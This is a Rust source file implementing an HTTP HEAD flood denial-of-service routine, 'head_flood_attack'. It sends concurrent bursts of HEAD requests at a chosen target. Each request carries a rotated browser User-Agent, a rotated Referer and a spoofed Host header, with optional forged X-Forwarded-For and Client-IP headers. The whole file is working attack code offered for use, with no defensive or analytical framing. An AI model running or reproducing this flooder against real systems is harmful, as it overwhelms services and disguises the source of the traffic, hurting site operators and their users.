//-------------------------------------------------------------------
// Programmer       : Ebrahim Shafiei (EbraSha)
// Email            : Prof.Shafiei@Gmail.com
//-------------------------------------------------------------------

use std::time::Duration;
use rand::{thread_rng, Rng};
use rand::seq::SliceRandom;
use reqwest::header::*;
use std::sync::Arc;
use tokio::task;

#[derive(Clone)]
pub struct AttackOptions {
    pub show_requests: bool,
    pub show_responses: bool,
    pub user_agents: Option<Vec<String>>,
    pub referers: Option<Vec<String>>,
    pub spoof_ip: bool,
    pub spoofed_ip: Option<String>,
    pub client_ip: Option<String>,
    pub connection: Option<String>,
    pub custom_host: Option<String>,
}

pub async fn head_flood_attack(
    target: &str,
    requests: usize,
    concurrency: usize,
    options: AttackOptions,
) {
    let target = target.to_string();
    let shared_target = Arc::new(target);

    let mut handles = vec![];

    for _ in 0..concurrency {
        let target_clone = Arc::clone(&shared_target);
        let options_clone = options.clone();

        let handle = task::spawn_blocking(move || {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(async move {
                let client = reqwest::Client::builder()
                    .timeout(Duration::from_secs(10))
                    .build()
                    .unwrap();

                for _ in 0..(requests / concurrency) {
                    let _ = send_head_request(&client, &target_clone, &options_clone).await;
                }
            });
        });

        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
}

async fn send_head_request(
    client: &reqwest::Client,
    target: &str,
    options: &AttackOptions,
) -> Result<(), reqwest::Error> {
    let mut headers = HeaderMap::new();
    let mut rng = thread_rng();

    // User-Agent
    let user_agent = if let Some(agents) = &options.user_agents {
        agents.choose(&mut rng).unwrap().clone()
    } else {
        let default_agents = vec![
            // Google Chrome on Windows 10
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",

            // Mozilla Firefox on Windows 10
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",

            // Microsoft Edge on Windows 10
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 Edg/123.0.2420.65",

            // Safari on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",

            // Opera on Windows 10
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 OPR/99.0.4788.77",
        ];
        default_agents.choose(&mut rng).unwrap().to_string()
    };
    headers.insert(USER_AGENT, HeaderValue::from_str(&user_agent).unwrap());

    // Referer
    let referer = if let Some(refs) = &options.referers {
        refs.choose(&mut rng).unwrap().clone()
    } else {
        let default_refs = vec![
            "https://google.com",
            "https://github.com",
            "https://cloudflare.com",
            "https://stackoverflow.com",
        ];
        default_refs.choose(&mut rng).unwrap().to_string()
    };
    headers.insert(REFERER, HeaderValue::from_str(&referer).unwrap());

    headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("gzip, deflate"));
    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));

    // Host
    let host_value = if let Some(custom) = &options.custom_host {
        custom.clone()
    } else {
        let default_hosts = vec![
            "https://google.com",
            "https://github.com",
            "https://cloudflare.com",
            "https://stackoverflow.com",
        ];
        default_hosts.choose(&mut rng).unwrap().to_string()
    };
    headers.insert(HOST, HeaderValue::from_str(&host_value).unwrap());

    // IP Spoofing
    if options.spoof_ip {
        if let Some(ip1) = &options.spoofed_ip {
            headers.insert("X-Forwarded-For", HeaderValue::from_str(ip1).unwrap());
        }
        if let Some(ip2) = &options.client_ip {
            headers.insert("Client-IP", HeaderValue::from_str(ip2).unwrap());
        }
    }

    // Connection
    if let Some(conn) = &options.connection {
        headers.insert(CONNECTION, HeaderValue::from_str(conn).unwrap());
    }

    if options.show_requests {
        println!("[REQUEST] HEAD {}", target);
    }

    let response = client.head(target).headers(headers).send().await;

    match response {
        Ok(res) => {
            if options.show_responses {
                println!("[RESPONSE] {} {}", res.status(), target);
            }
        }
        Err(e) => {
            if options.show_responses {
                println!("[ERROR] Request failed: {}", e);
            }
        }
    }

    Ok(())
}
